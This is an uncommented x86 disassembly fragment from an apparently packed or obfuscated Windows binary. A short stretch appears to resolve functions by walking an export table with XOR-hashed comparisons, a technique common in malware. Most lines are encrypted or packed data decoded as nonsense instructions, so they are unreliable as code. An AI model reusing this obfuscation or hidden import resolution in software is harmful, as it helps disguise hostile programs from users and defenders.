  40c075:	xor    DWORD PTR [edx-0x507a150],esi
  40c07b:	lock gs stc 
  40c07e:	pop    ebp
  40c07f:	pusha  
  40c080:	mov    DWORD PTR [edi-0x2d275b29],edx
  40c086:	call   DWORD PTR [ebx]
  40c088:	aaa    
  40c089:	clc    
  40c08a:	xor    eax,0x9e81e9ce
  40c08f:	xlat   BYTE PTR ds:[ebx]
  40c090:	in     eax,0xd
  40c092:	or     esi,DWORD PTR [eax-0x6f]
  40c095:	in     al,0x1e
  40c097:	add    ecx,DWORD PTR [eax+0x20]
  40c09a:	mov    eax,ds:0x430542
  40c09f:	or     eax,DWORD PTR ds:0x42ee0c
  40c0a5:	mov    ds:0x430542,eax
  40c0aa:	mov    DWORD PTR [ebp-0x28],ecx
  40c0ad:	mov    eax,DWORD PTR [ebp-0x14]
  40c0b0:	or     DWORD PTR ds:0x42ee1c,0x6327
  40c0ba:	mov    ecx,DWORD PTR [ebp+0x8]
  40c0bd:	add    ecx,DWORD PTR [eax+0x24]
  40c0c0:	mov    eax,ds:0x43049e
  40c0c5:	xor    eax,DWORD PTR ds:0x42e762
  40c0cb:	mov    ds:0x43049e,eax
  40c0d0:	mov    DWORD PTR [ebp-0x2c],ecx
  40c0d3:	and    DWORD PTR ds:0x4304a6,0x0
  40c0dd:	mov    eax,ds:0x4304a6
  40c0e2:	inc    eax
  40c0e3:	mov    ds:0x4304a6,eax
  40c0e8:	cmp    DWORD PTR ds:0x4304a6,0x1b
  40c0ef:	jne    0x40c11d
  40c0f5:	push   0x4304b2
  40c0fa:	push   0x1519
  40c0ff:	push   DWORD PTR [ebp-0x18]
  40c102:	push   0x42e776
  40c107:	push   DWORD PTR [ebp-0x24]
  40c10a:	push   0x42e8f3
  40c10f:	push   DWORD PTR [ebp-0x24]
  40c112:	push   0x667e
  40c117:	call   DWORD PTR ds:0x42eaf4
  40c11d:	cmp    DWORD PTR ds:0x4304a6,0x14
  40c124:	jb     0x40c0dd
  40c12a:	mov    eax,DWORD PTR [ebp-0x14]
  40c12d:	mov    ecx,DWORD PTR [ebp+0x8]
  40c130:	add    ecx,DWORD PTR [eax+0x1c]
  40c133:	xor    esi,esi
  40c135:	jmp    0x40c293
  40c13a:	xchg   ebp,eax
  40c13b:	leave  
  40c13c:	popa   
  40c13d:	jge    0x40c1bc
  40c13f:	jge    0x40c0ee
  40c141:	fldenv [eax-0x2b]
  40c144:	test   al,0xed
  40c146:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c147:	push   es
  40c148:	pop    es
  40c149:	in     eax,dx
  40c14a:	xor    bh,ch
  40c14c:	jle    0x40c1cc
  40c14e:	aas    
  40c14f:	jg     0x40c1cf
  40c151:	jle    0x40c14b
  40c153:	cmp    al,0x1a
  40c155:	call   0x7943:0xc5ac4bcf
  40c15c:	adc    eax,0x3b7618f8
  40c161:	xchg   esp,eax
  40c162:	in     al,dx
  40c163:	jmp    FWORD PTR [ebp-0x498e5bfd]
  40c169:	xor    BYTE PTR [ecx+0x6955e587],dl
  40c16f:	mov    dh,0x21
  40c171:	fld    DWORD PTR [esi]
  40c173:	cmp    DWORD PTR [esi+0x6a2c9f31],ecx
  40c179:	sar    DWORD PTR [ebp-0x6e],0xbb
  40c17d:	ins    DWORD PTR es:[edi],dx
  40c17e:	jle    0x40c1ab
  40c180:	daa    
  40c181:	(bad)  
  40c183:	or     edi,ebx
  40c185:	push   0x823c29e3
  40c18a:	mov    BYTE PTR [ecx],cl
  40c18c:	int    0x49
  40c18e:	idiv   bl
  40c190:	jecxz  0x40c18c
  40c192:	lods   eax,DWORD PTR ds:[esi]
  40c193:	or     ebx,edx
  40c195:	ja     0x40c20c
  40c197:	or     dh,bh
  40c199:	imul   eax,DWORD PTR ss:[edx+0x46],0x3efa791
  40c1a1:	add    eax,DWORD PTR [esi]
  40c1a3:	inc    ebx
  40c1a4:	pop    ebx
  40c1a5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c1a6:	cmp    esi,ebx
  40c1a8:	test   DWORD PTR [ebx*2+0x3a3eb00],ebx
  40c1af:	scas   eax,DWORD PTR es:[edi]
  40c1b0:	adc    eax,0x3021b528
  40c1b5:	fldenv [ebp+0x4b]
  40c1b8:	xor    BYTE PTR [ebp+0x6a],ah
  40c1bb:	adc    DWORD PTR [ebx],edi
  40c1bd:	dec    edx
  40c1be:	ss pushf 
  40c1c0:	sbb    edi,edx
  40c1c2:	sbb    eax,0x392c9748
  40c1c7:	mov    ss,WORD PTR [esi]
  40c1c9:	dec    ecx
  40c1ca:	lods   al,BYTE PTR fs:[esi]
  40c1cc:	adc    BYTE PTR [eax-0x5391aed9],bl
  40c1d2:	xor    eax,0x38eeb918
  40c1d7:	aam    0x40
  40c1d9:	js     0x40c218
  40c1db:	addr16 dec ecx
  40c1dd:	jmp    0x77ee:0xc9fa20fe
  40c1e4:	into   
  40c1e5:	pusha  
  40c1e6:	call   FWORD PTR [ebx-0x64]
  40c1e9:	or     eax,DWORD PTR [eax+0x19]
  40c1ec:	xor    BYTE PTR [edi+ebx*4+0x4ef4ebf5],bl
  40c1f3:	hlt    
  40c1f4:	enter  0x4ec5,0xb8
  40c1f8:	dec    edi
  40c1f9:	fcom   QWORD PTR [ebx]
  40c1fb:	xchg   esi,eax
  40c1fc:	aam    0xaf
  40c1fe:	or     ch,ch
  40c200:	fld    TBYTE PTR [edi+eax*1]
  40c203:	pushf  
  40c204:	scas   eax,DWORD PTR es:[edi]
  40c205:	sbb    al,0xa2
  40c207:	rcr    al,cl
  40c209:	pusha  
  40c20a:	xor    ebp,edi
  40c20c:	sub    al,0x9d
  40c20e:	outs   dx,DWORD PTR ds:[esi]
  40c20f:	inc    edx
  40c210:	enter  0x30e5,0x1a
  40c214:	test   ebp,0x67dcb5ad
  40c21a:	push   es
  40c21b:	and    ebx,DWORD PTR [ebx-0x2ba2a2b2]
  40c221:	jp     0x40c23a
  40c223:	retf   
  40c224:	(bad)  
  40c226:	ret    0xad7e
  40c229:	cmp    al,bh
  40c22b:	int    0x8b
  40c22d:	push   ebx
  40c22e:	mov    cl,BYTE PTR [ebx+0x2a]
  40c231:	std    
  40c232:	stos   DWORD PTR es:[edi],eax
  40c233:	sbb    dl,BYTE PTR fs:[eax+0x7c]
  40c237:	aam    0xa2
  40c239:	popa   
  40c23a:	push   es
  40c23b:	call   0xbab5ba94
  40c240:	and    edi,DWORD PTR [eax-0xc]
  40c243:	jle    0x40c298
  40c245:	jnp    0x40c224
  40c247:	aaa    
  40c248:	pop    ecx
  40c249:	test   eax,0x44582c52
  40c24e:	mov    eax,ds:0x4697ccaa
  40c253:	je     0x40c21d
  40c255:	mov    ebp,0x6a14be8c
  40c25a:	setp   BYTE PTR ds:0xbec71e70
  40c261:	dec    eax
  40c262:	mov    ebp,0x78edc10a
  40c267:	repnz inc ebp
  40c269:	icebp  
  40c26a:	fcom   DWORD PTR [edi]
  40c26c:	sbb    BYTE PTR [ecx-0x10],ah
  40c26f:	sub    bh,BYTE PTR [ebx+0x73]
  40c272:	cmp    BYTE PTR [ebx],ah
  40c274:	xor    eax,DWORD PTR [ecx]
  40c276:	pop    edi
  40c277:	push   esi
  40c278:	cmp    DWORD PTR [ebx+0x251671d8],0x9e7b1a4f
  40c282:	retf   0xe61b
  40c285:	repnz addr16 or al,0x8c
  40c289:	xor    eax,0xeb59177d
  40c28e:	int    0xa7
  40c290:	inc    edx
  40c291:	es mov ebp,0x8bec4d89
  40c297:	inc    ebp
  40c298:	fmul   DWORD PTR [ebx+0xc03084d]
  40c29e:	mov    eax,0x159e9
  40c2a3:	add    BYTE PTR [ebp-0x42cd666a],cl
  40c2a9:	in     eax,0x5d
  40c2ab:	imul   edx,DWORD PTR ds:0x49e92bcc,0xf334e57f
  40c2b5:	(bad)  
  40c2b6:	jle    0x40c336
  40c2b8:	aas    
  40c2b9:	jg     0x40c339
  40c2bb:	jle    0x40c2ca
  40c2bd:	sbb    eax,0xce4f1acf
  40c2c2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c2c3:	cmp    BYTE PTR [edx],dh
  40c2c5:	pop    esp
  40c2c6:	push   ebx
  40c2c7:	loop   0x40c2f8
  40c2c9:	out    0xde,eax
  40c2cb:	xchg   edx,eax
  40c2cc:	xchg   ebx,eax
  40c2cd:	aam    0x40
  40c2cf:	fmul   st(4),st
  40c2d1:	imul   ecx,DWORD PTR [esi],0xffffffda
  40c2d4:	mov    dl,bh
  40c2d6:	inc    esi
  40c2d7:	mov    DWORD PTR fs:[edi+0x18911033],eax
  40c2de:	aam    0xe6
  40c2e0:	enter  0x466,0x17
  40c2e4:	add    eax,0x884b935f
  40c2e9:	adc    eax,ebp
  40c2eb:	mov    edx,0x88406c5d
  40c2f0:	xchg   esi,eax
  40c2f1:	pop    edx
  40c2f2:	pop    ecx
  40c2f3:	shl    DWORD PTR [esi+ecx*4],0x23
  40c2f7:	mov    dl,ah
  40c2f9:	push   0x5f
  40c2fb:	inc    esi
  40c2fc:	lock js 0x40c2b4
  40c2ff:	mov    cl,0x7e
  40c301:	mov    DWORD PTR [ecx-0x344df083],ebx
  40c307:	jnp    0x40c35f
  40c309:	data16 jnp 0x40c367
  40c30c:	std    
  40c30d:	adc    BYTE PTR [ebx+esi*2],cl
  40c310:	stos   BYTE PTR es:[edi],al
  40c311:	scas   eax,DWORD PTR es:[edi]
  40c312:	xchg   ebp,eax
  40c313:	les    edx,FWORD PTR [ecx+edx*1+0x40079848]
  40c31a:	ret    0xe7d9
  40c31d:	xchg   esp,eax
  40c31e:	enter  0xe690,0xaf
  40c322:	mov    ebp,0x21c528e7
  40c327:	push   esi
  40c328:	cmp    eax,0x8b09bac6
  40c32d:	aad    0x1a
  40c32f:	loop   0x40c2ba
  40c331:	les    esi,FWORD PTR [ecx+0x60]
  40c334:	or     eax,esp
  40c336:	push   ecx
  40c337:	mov    edx,0x3a2c5c75
  40c33c:	cmp    BYTE PTR [esi+0xb9a2ea1],dh
  40c342:	or     esi,DWORD PTR [ebx+eiz*4-0x2c98c291]
  40c349:	mov    cl,0x5b
  40c34b:	imul   esp,DWORD PTR [edi-0x3f0d0137],0x5
  40c352:	arpl   WORD PTR [ecx-0x7c3ca76a],dx
  40c358:	out    0x8b,al
  40c35a:	cmp    eax,0xeee0e0a5
  40c35f:	sbb    ch,BYTE PTR [ebx-0x6ee5971e]
  40c365:	stc    
  40c366:	aad    0x4f
  40c368:	(bad)  
  40c369:	mov    ebp,0xa47dc707
  40c36e:	fiadd  DWORD PTR cs:[ebx+0x40]
  40c372:	jb     0x40c3ae
  40c374:	sbb    cl,BYTE PTR [eax+0x7ab5e2de]
  40c37a:	cld    
  40c37b:	or     eax,0x54193e1b
  40c380:	jb     0x40c381
  40c382:	jb     0x40c3b8
  40c384:	pop    ebp
  40c385:	int3   
  40c386:	add    eax,0xceff1c76
  40c38b:	and    dl,BYTE PTR [ebx+0x7001429c]
  40c391:	jne    0x40c31c
  40c393:	outs   dx,BYTE PTR ds:[esi]
  40c394:	fisubr WORD PTR [eax]
  40c396:	inc    eax
  40c397:	sub    cl,dh
  40c399:	test   DWORD PTR [eax+0x76cde343],esi
  40c39f:	addr16 dec esi
  40c3a1:	cmp    DWORD PTR [eax+0x7ca97913],0x4d
  40c3a8:	mov    ah,0x14
  40c3aa:	xchg   esp,eax
  40c3ab:	ret    
  40c3ac:	jl     0x40c415
  40c3ae:	pop    ds
  40c3af:	cli    
  40c3b0:	push   0xffffff8b
  40c3b2:	push   ebx
  40c3b3:	xchg   edx,eax
  40c3b4:	adc    al,0x97
  40c3b6:	out    dx,eax
  40c3b7:	pushf  
  40c3b8:	jns    0x40c33d
  40c3ba:	mov    eax,0xbd79be96
  40c3bf:	idiv   edx
  40c3c1:	jae    0x40c3ee
  40c3c3:	jne    0x40c3d4
  40c3c5:	or     BYTE PTR [edi],ah
  40c3c7:	sti    
  40c3c8:	bnd jbe 0x40c3ea
  40c3cb:	push   ecx
  40c3cc:	mov    ecx,0x51851e31
  40c3d1:	mov    bh,0x9
  40c3d3:	dec    esp
  40c3d4:	xor    ebx,DWORD PTR [ebp+0x3b74a7c3]
  40c3da:	ja     0x40c3d5
  40c3dc:	and    BYTE PTR [edi-0x5baeccab],al
  40c3e2:	push   edx
  40c3e3:	test   al,0x4d
  40c3e5:	adc    eax,0xe1b807c1
  40c3ea:	mov    al,ds:0xc0ad644f
  40c3ef:	loop   0x40c3c9
  40c3f1:	icebp  
  40c3f2:	fwait
  40c3f3:	adc    DWORD PTR [edx],0xffffffc5
  40c3f6:	pusha  
  40c3f7:	outs   dx,DWORD PTR ds:[esi]
  40c3f8:	test   DWORD PTR [esi-0x723aee68],edi
  40c3fe:	inc    ebp
  40c3ff:	clc    
  40c400:	jmp    0x40c55e
  40c405:	and    DWORD PTR [edx-0x5462d589],ebp
  40c40b:	and    eax,0xb3c66ebd
  40c410:	sti    
  40c411:	sub    al,BYTE PTR ds:[eax]
  40c414:	xor    dh,BYTE PTR [edi+edi*8+0x7f3f7e7e]
  40c41b:	jle    0x40c49b
  40c41d:	in     al,0x1b
  40c41f:	mov    bh,0xeb
  40c421:	(bad)  
  40c422:	ins    DWORD PTR es:[edi],dx
  40c423:	or     BYTE PTR [esi+esi*8],bh
  40c426:	sar    esp,cl
  40c428:	or     ecx,ebx
  40c42a:	pop    edx
  40c42b:	in     al,dx
  40c42c:	je     0x40c409
  40c42e:	pushf  
  40c42f:	push   edx
  40c430:	js     0x40c408
  40c432:	xchg   ecx,eax
  40c433:	add    ecx,DWORD PTR [ebp+0x41cf114]
  40c439:	inc    edi
  40c43a:	in     al,0x60
  40c43c:	pop    ebx
  40c43d:	mov    edx,edx
  40c43f:	pop    esi
  40c440:	out    dx,eax
  40c441:	int3   
  40c442:	popf   
  40c443:	pushf  
  40c444:	or     ebx,DWORD PTR [ecx-0x9]
  40c447:	sub    ecx,DWORD PTR [eax-0x1a]
  40c44a:	bound  ebx,QWORD PTR ds:0xec6f4ad0
  40c450:	bound  ecx,QWORD PTR [eax+edx*4]
  40c453:	ins    DWORD PTR es:[edi],dx
  40c454:	and    DWORD PTR [esi-0x66d6c7e],edx
  40c45a:	call   FWORD PTR [ecx-0x32]
  40c45d:	fwait
  40c45e:	test   eax,0x8bfb40af
  40c463:	mov    WORD PTR [edi-0x45bfada0],fs
  40c469:	jge    0x40c4bd
  40c46b:	or     DWORD PTR [ebp*2-0x66ddd294],ecx
  40c472:	xchg   ecx,eax
  40c473:	(bad)  [edi-0x6c]
  40c476:	mov    ch,0xb6
  40c478:	xor    al,0x13
  40c47a:	add    al,0xf2
  40c47c:	adc    DWORD PTR [ebx],0xc4d840aa
  40c482:	or     al,0x10
  40c484:	cld    
  40c485:	mov    edi,0x413692fd
  40c48a:	frstor [edx]
  40c48c:	adc    BYTE PTR ds:0x6d77dd3e,ch
  40c492:	in     al,dx
  40c493:	mov    bh,0x2b
  40c495:	sbb    edi,edi
  40c497:	mov    bh,0x12
  40c499:	jle    0x40c49b
  40c49b:	jno    0x40c498
  40c49d:	out    dx,eax
  40c49e:	(bad)  [ebp+0x6ede3cdb]
  40c4a4:	pushf  
  40c4a5:	mov    ebp,0x7e22ac1
  40c4aa:	ins    BYTE PTR es:[di],dx
  40c4ac:	push   es
  40c4ad:	xchg   esi,eax
  40c4ae:	xchg   BYTE PTR [ecx+esi*8-0x1301caf1],cl
  40c4b5:	out    dx,al
  40c4b6:	rcr    DWORD PTR [ebp+edi*4+0xd],0xe0
  40c4bb:	and    ebp,ecx
  40c4bd:	dec    esp
  40c4be:	shl    cl,1
  40c4c0:	push   ds
  40c4c1:	pop    esi
  40c4c2:	adc    esi,DWORD PTR [eax]
  40c4c4:	adc    DWORD PTR [ebx+0x30],ebp
  40c4c7:	(bad)  
  40c4c8:	push   ss
  40c4c9:	mov    eax,ds:0x16fe848b
  40c4ce:	push   0xffffffc5
  40c4d0:	sbb    BYTE PTR [ebx-0x4829d793],cl
  40c4d6:	xchg   ebx,eax
  40c4d7:	push   esi
  40c4d8:	cmp    al,0x6b
  40c4da:	sbb    al,0x42
  40c4dc:	add    DWORD PTR [ebx+0x5bd59de0],esi
  40c4e2:	push   0x4c28ad5b
  40c4e7:	mov    ch,BYTE PTR ds:0xdd110017
  40c4ed:	imul   esp,DWORD PTR [edx-0x59],0x18
  40c4f1:	push   0x2b
  40c4f3:	mov    al,0x74
  40c4f5:	outs   dx,BYTE PTR ds:[esi]
  40c4f6:	in     al,dx
  40c4f7:	push   edx
  40c4f8:	inc    edi
  40c4f9:	data16 mov al,ds:0xbb10289c
  40c4ff:	pmuludq mm6,QWORD PTR [edi]
  40c502:	sbb    BYTE PTR [edx+0x35c6baa4],dl
  40c508:	sahf   
  40c509:	out    dx,al
  40c50a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c50b:	dec    edi
  40c50c:	xlat   BYTE PTR ds:[ebx]
  40c50d:	push   0xd
  40c50f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c510:	xlat   BYTE PTR ds:[ebx]
  40c511:	popf   
  40c512:	or     dl,BYTE PTR [edx-0x34]
  40c515:	stc    
  40c516:	cmp    DWORD PTR [ecx+0x1caabb97],edx
  40c51c:	push   esp
  40c51d:	lea    ecx,[ecx+0x7f]
  40c520:	jg     0x40c58e
  40c522:	pushf  
  40c523:	mov    edi,DWORD PTR [edx]
  40c525:	pop    ecx
  40c526:	(bad)  
  40c527:	lds    edi,FWORD PTR [esp+ebx*4-0x7b]
  40c52b:	out    dx,eax
  40c52c:	dec    edi
  40c52d:	mov    ch,0xb5
  40c52f:	popa   
  40c530:	icebp  
  40c531:	fwait
  40c532:	pop    ds
  40c533:	mov    ch,0x33
  40c535:	and    al,0x3a
  40c537:	cmp    eax,0x10966d3
  40c53c:	inc    edx
  40c53d:	jnp    0x40c531
  40c53f:	dec    esp
  40c540:	int    0xb1
  40c542:	or     edi,DWORD PTR es:[ebp+0x6850b0ff]
  40c549:	rcr    esi,cl
  40c54b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c54c:	loop   0x40c5ae
  40c54e:	ins    BYTE PTR es:[edi],dx
  40c54f:	cmp    eax,ebx
  40c551:	les    eax,FWORD PTR [ecx-0x66]
  40c554:	and    ebp,esi
  40c556:	mov    ah,0x3e
  40c558:	out    0x58,eax
  40c55a:	jl     0x40c501
  40c55c:	cli    
  40c55d:	jns    0x40c4e8
  40c55f:	dec    ebp
  40c560:	rcl    BYTE PTR [eax-0x1],1
  40c563:	jne    0x40c535
  40c565:	push   DWORD PTR [ebp+0xc]
  40c568:	call   0x406fc8
  40c56d:	mov    eax,DWORD PTR [ebp-0x4]
  40c570:	jmp    0x40c6ce
  40c575:	push   esi
  40c576:	sahf   
  40c577:	sbb    al,0x64
  40c579:	fdivr  QWORD PTR [esi+edx*2-0x44]
  40c57d:	or     esi,DWORD PTR [esi-0x27]
  40c580:	cmp    eax,0xa995af64
  40c585:	jne    0x40c578
  40c587:	jle    0x40c607
  40c589:	aas    
  40c58a:	jg     0x40c60a
  40c58c:	jle    0x40c5bb
  40c58e:	shl    BYTE PTR [ebx],1
  40c590:	pop    ecx
  40c591:	cwde   
  40c592:	loope  0x40c5da
  40c594:	add    eax,0xf904f82b
  40c599:	lods   eax,DWORD PTR ds:[esi]
  40c59a:	mov    dh,0x67
  40c59c:	mov    bl,0x90
  40c59e:	in     al,0x6f
  40c5a0:	imul   esi,DWORD PTR [esi+0x4d03f503],0x40
  40c5a7:	out    0xf9,al
  40c5a9:	lea    eax,[edi-0x7f831678]
  40c5af:	clc    
  40c5b0:	shl    ecx,0x65
  40c5b3:	addr16 or al,0xa2
  40c5b6:	push   ebp
  40c5b7:	cmp    bl,ch
  40c5b9:	stos   BYTE PTR es:[edi],al
  40c5ba:	adc    esi,esp
  40c5bc:	push   ds
  40c5bd:	inc    edi
  40c5be:	xor    al,0x18
  40c5c0:	mov    ebx,DWORD PTR [edi]
  40c5c2:	aaa    
  40c5c3:	popf   
  40c5c4:	dec    edi
  40c5c5:	ins    DWORD PTR es:[edi],dx
  40c5c6:	rol    DWORD PTR [eax+0x20],cl
  40c5c9:	mov    al,ds:0xa30d131e
  40c5ce:	rol    BYTE PTR [eax+eiz*2],1
  40c5d1:	sbb    eax,0x8531500d
  40c5d6:	sbb    ecx,DWORD PTR [ecx-0x543b92fd]
  40c5dc:	iret   
  40c5dd:	sar    DWORD PTR [edi],0x9f
  40c5e0:	and    edx,ecx
  40c5e2:	sub    esi,DWORD PTR ds:0x4f555d00
  40c5e8:	hlt    
  40c5e9:	(bad)  
  40c5ea:	das    
  40c5eb:	rol    ah,1
  40c5ed:	mov    eax,ds:0xc16374d1
  40c5f2:	or     al,0xd7
  40c5f4:	lds    ebp,FWORD PTR [edx]
  40c5f6:	out    0x39,eax
  40c5f8:	pop    ss
  40c5f9:	adc    eax,0x70f0e183
  40c5fe:	stos   BYTE PTR es:[edi],al
  40c5ff:	mov    ch,0xb1
  40c601:	jne    0x40c60a
  40c603:	pop    ss
  40c604:	xlat   BYTE PTR ds:[ebx]
  40c605:	inc    esp
  40c606:	xor    ah,BYTE PTR [edi]
  40c608:	xchg   esp,eax
  40c609:	(bad)  
  40c60a:	mul    BYTE PTR [edx+0x3a]
  40c60d:	clc    
  40c60e:	iret   
  40c60f:	bswap  esp
  40c611:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c612:	aaa    
  40c613:	adc    al,0x3e
  40c615:	xchg   edx,eax
  40c616:	lods   eax,DWORD PTR ds:[esi]
  40c617:	out    0x5a,eax
  40c619:	(bad)  
  40c61a:	fcomi  st,st(1)
  40c61c:	mov    al,ds:0xdc1dc95b
  40c621:	ds clc 
  40c623:	xor    ecx,DWORD PTR [edi+0x59]
  40c626:	arpl   WORD PTR ss:0x1c10f224,cx
  40c62d:	adc    al,0xe4
  40c62f:	pop    esp
  40c630:	add    bh,ch
  40c632:	fimul  DWORD PTR [ebp+ebx*1+0x1b]
  40c636:	ror    DWORD PTR [edi-0x46af9ecb],cl
  40c63c:	jne    0x40c5f4
  40c63e:	cdq    
  40c63f:	js     0x40c642
  40c641:	dec    ecx
  40c642:	mov    cl,0xf5
  40c644:	test   al,0x2
  40c646:	sbb    eax,0x6681b1f1
  40c64b:	mov    edi,0x59b220e1
  40c650:	adc    al,0x7b
  40c652:	les    ebx,FWORD PTR [ebx+eiz*8]
  40c655:	push   cs
  40c656:	sbb    ebp,DWORD PTR [edx+0x50]
  40c659:	fsub   st(4),st
  40c65b:	(bad)  
  40c65c:	leave  
  40c65d:	ds out 0x5a,al
  40c660:	mov    DWORD PTR [eax+0x456847d3],0xef9c4bd
  40c66a:	and    al,0xe
  40c66c:	(bad)  
  40c66d:	cmp    esp,DWORD PTR [edx]
  40c66f:	or     edi,DWORD PTR [ecx]
  40c671:	call   0xaca3627
  40c676:	push   esi
  40c677:	sahf   
  40c678:	cmp    al,BYTE PTR [eax+0x30]
  40c67b:	outs   dx,DWORD PTR ds:[esi]
  40c67c:	std    
  40c67d:	imul   ebx,DWORD PTR ds:0x2ec44d5a,0xfa81e59e
  40c687:	add    ch,BYTE PTR [ebx+0x4f6e9e6a]
  40c68d:	and    al,0xc9
  40c68f:	dec    edx
  40c690:	push   ss
  40c691:	fcomip st,st(4)
  40c693:	xor    al,0x5
  40c695:	retf   
  40c696:	das    
  40c697:	and    eax,0x493964b9
  40c69c:	xor    eax,0xd2c2e5b9
  40c6a1:	clc    
  40c6a2:	int    0xee
  40c6a4:	xchg   DWORD PTR [edx*2-0x9454f22],esi
  40c6ab:	xchg   edi,eax
  40c6ac:	cs mov bl,0x20
  40c6af:	int    0x40
  40c6b1:	pop    edi
  40c6b2:	mov    eax,0x8e4e025
  40c6b7:	add    bl,ah
  40c6b9:	in     eax,0x24
  40c6bb:	adc    DWORD PTR [edi-0x2b],edx
  40c6be:	ret    0xfdce
  40c6c1:	clc    
  40c6c2:	lds    ecx,FWORD PTR [ebp+esi*4+0x65]
  40c6c6:	cs push edi
  40c6c8:	mov    eax,0x4ffdb1bb
  40c6cd:	jmp    0x3639145d
  40c6d2:	push   esi
  40c6d3:	or     BYTE PTR [ecx+0x7],dl
  40c6d6:	add    eax,ebx
  40c6d8:	cmp    ecx,eax
  40c6da:	jne    0x40c6fd
  40c6e0:	mov    eax,DWORD PTR [ebp-0x20]
  40c6e3:	inc    edi
  40c6e4:	cmp    edi,eax
  40c6e6:	jb     0x40b937
  40c6ec:	jmp    0x40c70d
  40c6f1:	mov    eax,DWORD PTR [ebp-0x4]
  40c6f4:	xor    eax,esi
  40c6f6:	add    eax,ebx
  40c6f8:	jmp    0x40e0f7
  40c6fd:	mov    eax,DWORD PTR [ebp-0x2c]
  40c700:	movzx  eax,WORD PTR [eax+edi*2]
  40c704:	mov    ecx,DWORD PTR [ebp-0x14]
  40c707:	mov    eax,DWORD PTR [ecx+eax*4]
  40c70a:	mov    DWORD PTR [ebp+0xc],eax
  40c70d:	mov    eax,DWORD PTR [ebp-0x4]
  40c710:	mov    ecx,DWORD PTR [ebp-0x8]
  40c713:	xor    eax,0x7510856
  40c718:	add    eax,ebx
  40c71a:	cmp    ecx,eax
  40c71c:	jne    0x40c88d
  40c722:	mov    eax,DWORD PTR [ebp-0x4]
  40c725:	xor    eax,0x7510856
  40c72a:	jmp    0x40c6f6
  40c72f:	jmp    0x40c88d
  40c734:	pop    eax
  40c735:	mov    WORD PTR ds:0x5da1fd90,?
  40c73b:	jl     0x40c715
  40c73d:	xchg   ecx,eax
  40c73e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c740:	cld    
  40c741:	fiadd  WORD PTR [edi]
  40c743:	and    BYTE PTR [esi],dh
  40c745:	bnd jle 0x40c7c6
  40c748:	aas    
  40c749:	jg     0x40c7c9
  40c74b:	jle    0x40c7cb
  40c74d:	adc    bh,BYTE PTR [edi]
  40c74f:	enter  0x2ca,0xcb
  40c753:	in     al,0xef
  40c755:	cmp    BYTE PTR gs:[ecx],0x56
  40c759:	xchg   DWORD PTR [ecx-0x754dd67a],esp
  40c75f:	push   edi
  40c760:	add    ebx,esi
  40c762:	adc    al,0x39
  40c764:	neg    dh
  40c766:	xchg   ecx,eax
  40c767:	sub    BYTE PTR ds:0x3e422ee7,dl
  40c76d:	sti    
  40c76e:	in     eax,0xd8
  40c770:	arpl   WORD PTR [edx],di
  40c772:	mov    ch,0x77
  40c774:	retf   0x4f40
  40c777:	push   ebp
  40c778:	mov    esi,0x7d514ff1
  40c77d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c77e:	dec    BYTE PTR [edx+eax*4+0x54e652b2]
  40c785:	das    
  40c786:	sbb    DWORD PTR ds:0x498a62a3,edx
  40c78c:	mov    ?,WORD PTR [edi]
  40c78e:	or     eax,0xcbcc2b47
  40c793:	mov    gs,WORD PTR [ebp+0x5f]
  40c796:	mov    dh,0x1b
  40c798:	mov    eax,0xd0fe7195
  40c79d:	mov    al,ds:0x60578640
  40c7a2:	cdq    
  40c7a3:	outs   dx,DWORD PTR ds:[esi]
  40c7a4:	imul   ebp,DWORD PTR [edx],0xfffffff9
  40c7a7:	or     ch,bh
  40c7a9:	sub    ebx,edx
  40c7ab:	pop    ebx
  40c7ac:	pop    esp
  40c7ad:	mov    esi,0x468d43b9
  40c7b2:	pushf  
  40c7b3:	dec    ebp
  40c7b4:	test   eax,0x738ff6af
  40c7b9:	sbb    BYTE PTR [esi+0x10848cc0],bh
  40c7bf:	scas   al,BYTE PTR es:[edi]
  40c7c0:	mov    dl,0xf4
  40c7c2:	xchg   esi,eax
  40c7c3:	js     0x40c7c0
  40c7c5:	sbb    dh,dl
  40c7c7:	pop    esi
  40c7c8:	in     al,dx
  40c7c9:	mov    ds:0x7bcce23,al
  40c7ce:	nop
  40c7cf:	inc    ecx
  40c7d0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c7d1:	push   ecx
  40c7d2:	out    dx,al
  40c7d3:	pop    eax
  40c7d4:	mov    ds:0x7d7c36e5,al
  40c7d9:	leave  
  40c7da:	repz pop ebp
  40c7dc:	fist   WORD PTR [esp+ebp*2+0x4b]
  40c7e0:	aam    0x83
  40c7e2:	cmp    al,0xed
  40c7e4:	jb     0x40c7db
  40c7e6:	inc    ecx
  40c7e7:	mov    eax,0xa1c572b8
  40c7ec:	test   eax,0x9c79ba50
  40c7f1:	jp     0x40c7be
  40c7f3:	push   esp
  40c7f4:	loope  0x40c7be
  40c7f6:	xchg   ecx,eax
  40c7f7:	sbb    bh,BYTE PTR [esi+ebx*4+0x2a]
  40c7fb:	mov    ah,0x8a
  40c7fd:	ror    BYTE PTR [esi-0x84acdb7],0x3a
  40c804:	mov    ebp,cs
  40c806:	nop
  40c807:	scas   al,BYTE PTR es:[edi]
  40c808:	sub    al,bh
  40c80a:	lods   al,BYTE PTR ds:[esi]
  40c80b:	adc    eax,0xf5b26f01
  40c810:	xchg   ebp,eax
  40c811:	jecxz  0x40c793
  40c813:	out    dx,al
  40c814:	pop    ss
  40c815:	mov    edi,0x3caa2a01
  40c81a:	rol    BYTE PTR [ebx+0x5f3184f1],0xe7
  40c821:	jmp    FWORD PTR [ebp-0x54]
  40c824:	cmp    eax,0x98a4c832
  40c829:	cmp    eax,0x866933f9
  40c82e:	mov    al,0xa4
  40c830:	cmp    eax,0x1a46d58c
  40c835:	push   ecx
  40c836:	sub    dh,cl
  40c838:	test   eax,0xb520f876
  40c83d:	jne    0x40c8a8
  40c83f:	mov    eax,ds:0x832fd791
  40c844:	dec    ecx
  40c845:	stos   BYTE PTR es:[edi],al
  40c846:	push   0x7e
  40c848:	jl     0x40c7ec
